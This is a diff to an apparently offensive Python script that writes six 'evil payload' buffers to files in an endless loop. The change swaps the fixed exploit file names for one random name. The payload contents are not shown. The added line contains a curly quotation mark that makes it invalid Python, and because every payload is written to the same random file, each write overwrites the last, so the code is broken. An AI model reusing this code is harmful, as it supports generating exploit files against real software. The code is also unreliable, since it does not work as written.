@@ -13,9 +13,11 @@ payload4 = buffer4
 payload5 = buffer5
 payload6 = buffer6
 
+random_file_name = ”.join(random.choices(string.ascii_letters + string.digits, k=10)) + ".txt"
+
 while True:
     try:
-        f = open("exploit.txt","w")
+        f = open(random_file_name,"w")
         print("[+] Creating %s bytes evil payload.." %len(payload))
         f.write(payload)
         f.close()
@@ -24,7 +26,7 @@ while True:
         print("File cannot be created")
         
     try:
-        f = open("exploit2.txt","w")
+        f = open(random_file_name,"w")
         print("[+] Creating %s bytes evil payload.." %len(payload2))
         f.write(payload2)
         f.close()
@@ -33,7 +35,7 @@ while True:
         print("File cannot be created")
     
     try:
-        f = open("exploit3.txt","w")
+        f = open(random_file_name,"w")
         print("[+] Creating %s bytes evil payload.." %len(payload3))
         f.write(payload3)
         f.close()
@@ -42,7 +44,7 @@ while True:
         print("File cannot be created")
 
     try:
-        f = open("exploit4.txt","w")
+        f = open(random_file_name,"w")
         print("[+] Creating %s bytes evil payload.." %len(payload4))
         f.write(payload4)
         f.close()
@@ -52,7 +54,7 @@ while True:
 
 
     try:
-        f = open("exploit5.txt","w")
+        f = open(random_file_name,"w")
         print("[+] Creating %s bytes evil payload.." %len(payload5))
         f.write(payload5)
         f.close()
@@ -62,7 +64,7 @@ while True:
 
 
     try:
-        f = open("exploit6.txt","w")
+        f = open(random_file_name,"w")
         print("[+] Creating %s bytes evil payload.." %len(payload6))
         f.write(payload6)
         f.close()
